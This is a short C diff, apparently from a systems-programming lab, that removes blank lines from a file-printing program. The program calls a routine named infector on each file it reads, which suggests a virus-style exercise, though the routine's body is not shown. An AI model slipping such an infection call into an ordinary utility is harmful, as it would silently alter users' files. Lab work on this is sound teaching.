@@ -31,9 +31,7 @@ void printFileContent(char* fileName) {
         system_call(SYS_WRITE, STDOUT, buffer, readBytes);
         readBytes = system_call(READ, status, buffer, BUFFER_SIZE);
     }
-
     infector(fileName);
-
     system_call(CLOSE, status, 0, 0);
 }
 
@@ -48,6 +46,5 @@ int main(int argc, char* argv[]) {
         printFileContent(fileName);
 
     }
-
     return 0;
 }
